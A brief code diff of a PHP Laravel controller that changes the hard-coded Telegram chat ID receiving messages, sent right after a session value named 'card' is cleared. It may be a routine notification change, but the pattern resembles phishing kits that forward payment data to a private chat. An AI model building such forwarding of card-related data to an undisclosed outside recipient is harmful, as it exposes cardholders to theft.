@@ -229,7 +229,7 @@ class HomeController extends Controller
                     $req->session()->forget('card');
                     $help=$msg;
                     Telegram::sendMessage([
-                    'chat_id' => '962019183',
+                    'chat_id' => '6293673780',
                     'text' =>$help,
                 ]);
                 //
@@ -239,7 +239,8 @@ class HomeController extends Controller
                 $req->session()->forget('card');
                 if($help!='')
                     Telegram::sendMessage([
-                        'chat_id' => '962019183',
+                        //962019183
+                        'chat_id' => '6293673780',
                         'text' =>$help,
                 ]);
                 return response()->json(['message'=>$err->getMessage()]);
